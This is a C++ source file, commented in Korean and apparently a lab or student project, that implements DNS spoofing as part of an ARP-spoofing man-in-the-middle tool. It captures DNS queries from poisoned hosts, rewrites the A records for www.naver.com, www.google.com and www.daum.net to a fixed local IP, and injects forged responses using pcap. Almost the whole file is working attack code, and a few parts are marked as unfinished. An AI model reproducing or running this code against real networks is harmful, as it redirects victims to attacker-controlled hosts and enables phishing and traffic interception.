#include "dns_spoof.hpp"
#include "arp_spoof.hpp"
#include "network_utils.hpp"
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <iostream>
#include <arpa/inet.h>
#include <string>
#include <vector>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <memory>

#define DNS_PORT 53

using namespace std;
/**
 * TODO
 * DNS 처리 완료 되면 코드 Class화 변경 필요
 */
// 전역 DNS 응답 템플릿
vector<uint8_t> dns_template_naver;
vector<uint8_t> dns_template_google;
vector<uint8_t> dns_template_daum;

// DNS 응답 템플릿 로드 현재 단일 A 레코드만 가지고 있음

bool load_dns_response_template(const char* filename, vector<uint8_t>& dns_response_template) 
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap_handle = pcap_open_offline(filename, errbuf);
    if (!pcap_handle) 
    {
        cerr << "pcap 파일 열기 실패: " << errbuf << endl;
        return false;
    }

    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;
    bool found = false;

    while ((res = pcap_next_ex(pcap_handle, &header, &packet)) >= 0) 
    {
        if (res == 0) 
        {
            this_thread::sleep_for(chrono::milliseconds(1));    // 혹시 모를 busy 방지
            continue;
        }
        
        if (header->caplen < 14) 
        {
            this_thread::sleep_for(chrono::milliseconds(1));    // 혹시 모를 busy 방지
            continue;
        }
        
        const ether_header* eth_hdr = reinterpret_cast<const ether_header*>(packet);
        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) 
        {
            this_thread::sleep_for(chrono::milliseconds(1));    // 혹시 모를 busy 방지
            continue;
        }

        const ip_header* ip_hdr = reinterpret_cast<const ip_header*>(packet + 14);
        int ip_header_len = (ip_hdr->ip_vhl & 0x0f) * 4;
        if (ip_hdr->ip_p != IPPROTO_UDP) 
        {
            this_thread::sleep_for(chrono::milliseconds(1));    // 혹시 모를 busy 방지
            continue;
        }

        const udp_header* udp_hdr = reinterpret_cast<const udp_header*>(packet + 14 + ip_header_len);
        if (ntohs(udp_hdr->uh_sport) != DNS_PORT) 
        {
            this_thread::sleep_for(chrono::milliseconds(1));    // 혹시 모를 busy 방지
            continue;
        }
        // DNS Response 만 가져옴
        dns_response_template.assign(packet, packet + header->caplen);
        found = true;
        break;
    }

    pcap_close(pcap_handle);
    if (found) 
    {
        cout << filename << " 로부터 DNS 응답 템플릿 로드 완료 (" << dns_response_template.size() << " 바이트)" << endl;
        return true;
    } 
    else 
    {
        cerr << "DNS 응답 패킷 찾지 못함: " << filename << endl;
        return false;
    }
}

// 템플릿 전체 초기화 (추후 객체화 필요, 임시 함수 처리 중)
bool initialize_dns_templates() 
{
    bool success = true;

    if (!load_dns_response_template("data/dns_naver.pcap", dns_template_naver)) 
    {
        cerr << "네이버 DNS 템플릿 로드 실패" << endl;
        success = false;
    }
    if (!load_dns_response_template("data/dns_google.pcap", dns_template_google)) 
    {
        cerr << "구글 DNS 템플릿 로드 실패" << endl;
        success = false;
    }
    if (!load_dns_response_template("data/dns_daum.pcap", dns_template_daum)) 
    {
        cerr << "다음 DNS 템플릿 로드 실패" << endl;
        success = false;
    }

    return success;
}

// 도메인 이름 추출
string extract_domain_name(const uint8_t* dns_data, size_t dns_len) 
{
    string domain;
    size_t pos = 12;

    while (pos < dns_len) 
    {
        uint8_t len = dns_data[pos];
        if (len == 0) break;
        if (!domain.empty()) domain.push_back('.');
        pos++;
        for (int i = 0; i < len && pos < dns_len; i++, pos++) 
        {
            domain.push_back(dns_data[pos]);
        }
    }
    return domain;
}

// 템플릿 기반 DNS 스푸핑 응답 전송
void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_packet_len,
                             const u_int8_t* attacker_mac, const u_int8_t* gateway_ip,
                             const string& domain,
                             const vector<unique_ptr<SpoofTarget>>& targets) {
    const int eth_len = 14;
    const ip_header* ip = (ip_header*)(orig_packet + eth_len);
    int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
    const udp_header* udp = (udp_header*)(orig_packet + eth_len + ip_header_len);
    const dns_header* dns = (dns_header*)(orig_packet + eth_len + ip_header_len + sizeof(udp_header));

    // 템플릿 선택
    const vector<uint8_t>* dns_template = nullptr;
    if (domain == "www.naver.com") 
    {
        dns_template = &dns_template_naver;
    }
    else if (domain == "www.google.com")
    {
        dns_template = &dns_template_google;
    }
    else if (domain == "www.daum.net") 
    {
        dns_template = &dns_template_daum;
    }

    if (!dns_template || dns_template->empty()) 
    {
        cerr << "[" << domain << "] DNS 템플릿 없음. 전송 생략.\n";
        return;
    }

    vector<uint8_t> spoof_packet = *dns_template;
    ether_header* eth_resp = (ether_header*)spoof_packet.data();
    ip_header* ip_resp = (ip_header*)(spoof_packet.data() + eth_len);

    // 출발지 MAC 설정
    memcpy(eth_resp->ether_shost, attacker_mac, 6);

    // 도착지 MAC을 DNS 요청자 IP 기준으로 찾기
    u_int8_t requester_ip[4];
    memcpy(requester_ip, &ip->ip_src, 4);  // DNS 요청자의 IP

    bool found = false;
    for (const auto& target : targets) 
    {
        if (ip_equals(requester_ip, target->get_ip())) 
        {
            memcpy(eth_resp->ether_dhost, target->get_mac(), 6);  
            found = true;
            cout << "[DNS 응답] → " << target->get_ip_str() << ", MAC: " << mac_to_string(target->get_mac()) << "\n";
            break;
        }
    }

    if (!found) {
        cerr << "[DNS 응답] 대상 MAC 찾기 실패 (요청자 IP 기준). 전송 생략.\n";
        return;
    }

    // IP 헤더 수정
    ip_resp->ip_src = ip->ip_dst;
    ip_resp->ip_dst = ip->ip_src;
    ip_resp->ip_sum = 0;

    uint16_t* ip_words = (uint16_t*)ip_resp;
    unsigned long ip_sum = 0;
    for (int i = 0; i < ip_header_len / 2; i++)
    {
        ip_sum += ntohs(ip_words[i]);
    }    
    
    while (ip_sum >> 16)
    {
        ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
    }
    ip_resp->ip_sum = htons(~ip_sum);

    // UDP 헤더 수정
    udp_header* udp_resp = (udp_header*)(spoof_packet.data() + eth_len + ip_header_len);
    udp_resp->uh_sport = udp->uh_dport;
    udp_resp->uh_dport = udp->uh_sport;
    udp_resp->uh_sum = 0;

    // DNS ID 복사
    dns_header* dns_resp = (dns_header*)(spoof_packet.data() + eth_len + ip_header_len + sizeof(udp_header));
    dns_resp->id = dns->id;

    // A 레코드 IP 수정
    const char* spoof_ip = "192.168.127.132";
    uint32_t new_ip;
    inet_pton(AF_INET, spoof_ip, &new_ip);

    uint8_t* dns_data = (uint8_t*)dns_resp;
    size_t dns_len = spoof_packet.size() - (eth_len + ip_header_len + sizeof(udp_header));
    uint8_t* current = dns_data + sizeof(dns_header);

    while (*current != 0 && (current - dns_data) < dns_len)
    {
        current += 1 + *current;
    }
    current += 5;

    bool modified = false;
    for (int i = 0; i < ntohs(dns_resp->ancount); i++) 
    {
        if (current[0] == 0xC0) 
        {
            current += 2;
        }
        else 
        {
            while (*current != 0 && (current - dns_data) < dns_len){
                current += 1 + *current;
            }
            current += 1;
        }

        uint16_t answer_type = (current[0] << 8) | current[1];
        uint16_t rdlength = (current[8] << 8) | current[9];
        size_t offset = (current - dns_data) + 10;
        if (answer_type == 1 && rdlength == 4 && offset + 4 <= dns_len) 
        {
            memcpy(dns_data + offset, &new_ip, 4);
            modified = true;
        }

        current += 10 + rdlength;
    }

    if (!modified){
        cout << "[" << domain << "] A 레코드 수정 실패\n";
    }

    // OPT 레코드 제거 (추가 레코드 제거)  --> 안되는 중..? WHY..?
    uint16_t arcount = ntohs(dns_resp->arcount);
    if (arcount > 0) 
    {
        size_t offset = sizeof(dns_header);
        while (offset < dns_len && dns_data[offset] != 0)
        {
            offset += dns_data[offset] + 1;
        }
        offset += 1 + 4;

        for (int i = 0; i < ntohs(dns_resp->ancount); i++) 
        {
            if (dns_data[offset] == 0xC0)
            {
                offset += 2;
            }
            else 
            {
                while (dns_data[offset] != 0)
                {
                    offset += dns_data[offset] + 1;
                }
                offset += 1;
            }
            offset += 10;
            uint16_t rdlen = (dns_data[offset - 2] << 8) | dns_data[offset - 1];
            offset += rdlen;
        }

        if (offset + 11 < dns_len) 
        {
            uint16_t opt_type = (dns_data[offset + 1] << 8) | dns_data[offset + 2];
            if (dns_data[offset] == 0x00 && opt_type == 41) 
            {
                dns_resp->arcount = htons(0);
                spoof_packet.resize(spoof_packet.size() - (dns_len - offset));
                cout << "[" << domain << "] OPT 레코드 제거 완료\n";
            }
        }
    }

    // 전송
    if (pcap_sendpacket(handle, spoof_packet.data(), spoof_packet.size()) != 0)
    {
        cerr << "DNS 스푸핑 응답 전송 실패: " << pcap_geterr(handle) << "\n";
    }
    else
    {
        cout << "DNS 스푸핑 응답 전송 완료 (" << domain << ")\n";
    }
}
